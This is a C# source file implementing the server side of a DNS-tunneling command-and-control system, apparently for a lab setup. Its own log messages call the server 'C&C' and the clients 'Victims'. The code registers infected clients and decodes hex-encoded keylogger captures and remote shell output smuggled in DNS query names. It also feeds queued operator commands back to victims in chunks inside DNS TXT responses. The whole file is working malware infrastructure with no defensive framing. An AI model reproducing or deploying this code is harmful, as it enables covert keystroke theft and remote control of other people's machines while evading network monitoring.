using System.Net;
using System.Net.Sockets;
using Server.DNS;
using Server.Models;
using Server.Utilities;

namespace Server.Logic
{
    public class ServerLogic
    {
        private UdpClient? _udpServer;
        private bool _isRunning;
        private string _domain = "example.com";
        private string _serverIp = "100.123.123.123";  // Default C&C IP on Tailscale
        
        private ClientManager? _clientManager;
        private ProtocolHandler? _protocolHandler;
        // AuthoritativeDNSHandler removed - BIND9 handles normal DNS queries
        private readonly Dictionary<int, Queue<string>> _commandQueues = new();
        private readonly Dictionary<int, (string fullCommand, int totalChunks, int currentChunk)> _commandChunkState = new();


        public event Action<string>? OnLogMessage;
        public event Action<ClientInfo>? OnClientAdded;
        public event Action<int>? OnClientRemoved;
        public event Action<int>? OnClientCountChanged;
        public event Action<int, string>? OnDataReceived;
        public event Action<int, string>? OnCommandResult;


        public void Start(int port, string domain, string logPath, string serverIp = "127.0.0.1")
        {
            if (_isRunning) return;

            _domain = domain.ToLower();
            _serverIp = serverIp;
            
            _clientManager = new ClientManager(logPath);
            _protocolHandler = new ProtocolHandler(_domain);
            // BIND9 handles normal DNS, no need for AuthoritativeDNSHandler
            
            _clientManager.OnClientAdded += (info) => OnClientAdded?.Invoke(info);
            _clientManager.OnClientCountChanged += (count) => OnClientCountChanged?.Invoke(count);
            _protocolHandler.OnDataReceived += (id, data) => OnDataReceived?.Invoke(id, data);

            try
            {
                // Bind to specific IP address instead of 0.0.0.0
                IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Parse(_serverIp), port);
                _udpServer = new UdpClient(localEndPoint);
                _isRunning = true;

                LogMessage($"[Started] Authoritative DNS Server listening on {_serverIp}:{port}");
                LogMessage($"[Domain] {_domain}");
                LogMessage($"[Server IP] {_serverIp}");
                LogMessage($"[Logs] {Path.GetFullPath(logPath)}");
                LogMessage("[ARCHITECTURE] Tailscale DNS Tunneling");
                LogMessage("  => DNS Resolver: 100.111.111.100 (Bind9)");
                LogMessage("  => C&C Server: 100.123.123.123 (this machine)");
                LogMessage("  => Victims: 100.x.x.x (clients)");

                Task.Run(() => ListenForQueries());
            }
            catch (Exception ex)
            {
                LogMessage($"[Error] Failed to start: {ex.Message}");
            }
        }

        public void Stop()
        {
            if (!_isRunning) return;

            _isRunning = false;
            _udpServer?.Close();
            
            if (_clientManager != null)
            {
                _clientManager.SaveAllLogs(LogMessage);
            }
            
            LogMessage("[Stopped] Server stopped");
        }

        private async void ListenForQueries()
        {
            while (_isRunning && _udpServer != null)
            {
                try
                {
                    var result = await _udpServer.ReceiveAsync();
                    _ = Task.Run(() => ProcessQuery(result.Buffer, result.RemoteEndPoint));
                }
                catch (Exception ex)
                {
                    if (_isRunning)
                        LogMessage($"[Error] {ex.Message}");
                }
            }
        }

        private void ProcessQuery(byte[] data, IPEndPoint remoteEP)
        {
            if (_clientManager == null || _protocolHandler == null)
                return;

            try
            {
                var dnsQuery = DNSParser.ParseQuery(data);
                var queryName = dnsQuery.QueryName.ToLower();

                byte[] response;

                try
                {
                    string extractedData = _protocolHandler.GetData(queryName);
                    string[] parts = extractedData.Split('.', 2);
                    string packetType = parts[0];

                    if (packetType == "a" && dnsQuery.QueryType == 1)
                    {
                        LogMessage($"\n[Connect] {queryName}");
                        
                        string[] queryParts = queryName.Split('.');
                        string victimIP = remoteEP.Address.ToString();
                        
                        if (queryParts.Length >= 6)
                        {
                            string parsedIP = $"{queryParts[1]}.{queryParts[2]}.{queryParts[3]}.{queryParts[4]}";
                            
                            if (System.Net.IPAddress.TryParse(parsedIP, out _))
                            {
                                victimIP = parsedIP;
                            }
                        }
                        
                        int existingId = _clientManager.GetConnectionIdByIp(victimIP);
                        int connectionId;
                        
                        if (existingId > 0)
                        {
                            connectionId = existingId;
                        }
                        else
                        {
                            connectionId = _clientManager.AddClient(victimIP);
                            LogMessage($"[Client #{connectionId}] {victimIP}");
                            
                            lock (_commandQueues)
                            {
                                if (!_commandQueues.ContainsKey(connectionId))
                                {
                                    _commandQueues[connectionId] = new Queue<string>();
                                }
                            }
                        }

                        string fakeIp = IPGenerator.CreateStartIp(connectionId - 1);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, fakeIp);
                    }
                    else if (packetType == "b" && dnsQuery.QueryType == 1)
                    {
                        string rest = parts.Length > 1 ? parts[1] : "";
                        
                        // Parse packet and extract hex data
                        string[] bParts = rest.Split('.');
                        if (bParts.Length < 3)
                        {
                            throw new DNSSyntaxException();
                        }
                        
                        string hexData = bParts[2];
                        byte[] decodedData = Convert.FromHexString(hexData);
                        string keylogData = System.Text.Encoding.UTF8.GetString(decodedData);
                        
                        // Parse and save to parser
                        var metadata = _protocolHandler.ParseDataPacket(rest, _clientManager);
                        
                        // Save keylogger data immediately
                        var parser = _clientManager.GetParser(metadata.ConnectionId);
                        if (parser != null && decodedData.Length > 0)
                        {
                            parser.SaveDataByType(keylogData, Models.LogType.Keylogger);
                        }
                        
                        LogMessage($"[Keylog] Client #{metadata.ConnectionId}");

                        string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                    }
                    else if (packetType == "c" && dnsQuery.QueryType == 1)
                    {
                        string rest = parts.Length > 1 ? parts[1] : "";
                        
                        string[] cParts = rest.Split('.');
                        
                        if (cParts.Length < 4)
                        {
                            throw new DNSSyntaxException();
                        }

                        int packetNumber = int.Parse(cParts[0]);
                        int offset = int.Parse(cParts[1]);
                        int connectionId = int.Parse(cParts[2]);
                        
                        int domainDots = _domain.Count(c => c == '.');
                        int hexDataEndIndex = cParts.Length - domainDots - 1;
                        
                        string hexData = cParts[3];
                        if (hexDataEndIndex > 3)
                        {
                            for (int i = 4; i <= hexDataEndIndex; i++)
                            {
                                hexData += "." + cParts[i];
                            }
                        }

                        if (!_clientManager.ConnectionExists(connectionId))
                        {
                            throw new NXConnectionException();
                        }
                        
                        var parser = _clientManager.GetParser(connectionId);
                        if (parser != null)
                        {
                            byte[] decodedData = Convert.FromHexString(hexData);
                            parser.AddData(packetNumber, decodedData);
                            
                            string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
                            
                            // Save shell output immediately
                            parser.SaveDataByType(decodedText, Models.LogType.Shell);
                            
                            OnCommandResult?.Invoke(connectionId, decodedText);
                        }

                        string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                    }
                    else if (packetType == "p" && dnsQuery.QueryType == 16)
                    {
                        string rest = parts.Length > 1 ? parts[1] : "";
                        
                        string[] pParts = rest.Split('.');
                        if (pParts.Length < 3)
                        {
                            throw new DNSSyntaxException();
                        }

                        int packetNumber = int.Parse(pParts[0]);
                        int offset = int.Parse(pParts[1]);
                        int connectionId = int.Parse(pParts[2]);

                        if (!_clientManager.ConnectionExists(connectionId))
                        {
                            throw new NXConnectionException();
                        }

                        string commandChunk = "";
                        lock (_commandQueues)
                        {
                            if (!_commandChunkState.ContainsKey(connectionId))
                            {
                                if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
                                {
                                    string fullCommand = _commandQueues[connectionId].Dequeue();
                                    int totalChunks = (int)Math.Ceiling(fullCommand.Length / 60.0);
                                    _commandChunkState[connectionId] = (fullCommand, totalChunks, 0);
                                    LogMessage($"[Command] Sending to #{connectionId}: {fullCommand}");
                                }
                            }
                            
                            if (_commandChunkState.ContainsKey(connectionId))
                            {
                                var state = _commandChunkState[connectionId];
                                int chunkStart = offset * 60;
                                
                                if (chunkStart < state.fullCommand.Length)
                                {
                                    int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
                                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
                                    
                                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
                                    commandChunk = Convert.ToHexString(chunkBytes).ToLower();
                                    
                                    int nextChunkStart = (offset + 1) * 60;
                                    if (nextChunkStart >= state.fullCommand.Length)
                                    {
                                        _commandChunkState.Remove(connectionId);
                                    }
                                }
                                else
                                {
                                    _commandChunkState.Remove(connectionId);
                                }
                            }
                        }

                        response = DNSResponseBuilder.CreateTXTResponse(data, dnsQuery, commandChunk);
                    }
                    else
                    {
                        // Unknown packet type - should not happen as BIND9 only forwards our protocol queries
                        LogMessage($"[Warning] Unknown packet type from {remoteEP.Address}: {packetType}");
                        response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                    }
                }
                catch (ShortCircuitException)
                {
                    response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                }
                catch (DNSSyntaxException)
                {
                    LogMessage($"[Error] Improper syntax from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.MALFORMED);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (ServerMaxConnectionsException)
                {
                    LogMessage($"[Error] Max connections reached from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.MAX);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (NXConnectionException)
                {
                    LogMessage($"[Error] Connection does not exist from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.NX);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (PacketsOutOfOrderException)
                {
                    LogMessage($"[Error] Out of order packets from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OOO);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (Exception ex)
                {
                    LogMessage($"[Exception] {ex.Message} from {remoteEP.Address}");
                    response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                }

                _udpServer?.Send(response, response.Length, remoteEP);
            }
            catch (Exception ex)
            {
                LogMessage($"[Error] Processing query: {ex.Message}");
            }
        }

        public void EnqueueCommand(int connectionId, string command)
        {
            lock (_commandQueues)
            {
                if (_commandQueues.ContainsKey(connectionId))
                {
                    _commandQueues[connectionId].Enqueue(command);
                    LogMessage($"[Enqueue] #{connectionId}: {command}");
                }
                else
                {
                    LogMessage($"[Error] No queue for connection #{connectionId}");
                }
            }
        }

        private void LogMessage(string message)
        {
            OnLogMessage?.Invoke(message);
        }
    }
}
